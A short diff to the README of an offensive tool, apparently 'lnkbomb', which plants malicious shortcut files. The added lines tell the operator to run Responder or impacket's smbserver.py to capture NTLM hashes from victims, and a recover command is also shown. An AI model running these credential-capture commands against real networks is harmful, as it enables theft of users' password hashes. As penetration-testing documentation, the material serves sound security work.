@@ -35,6 +35,12 @@ Examples of full commands include:
 
 ```python3 lnkbomb.py -r randomfilegenerated.recover```
 
+You will need to utilize a tool like Responder or smbserver to capture the NTLM hash.  
+```responder -I eth0 -dwf -v```
+or
+```smbserver.py . . -smb2support```
+
+
 <p align="center">
   <img src="https://github.com/dievus/lnkbomb/blob/main/images/example2.png" />
 </p>
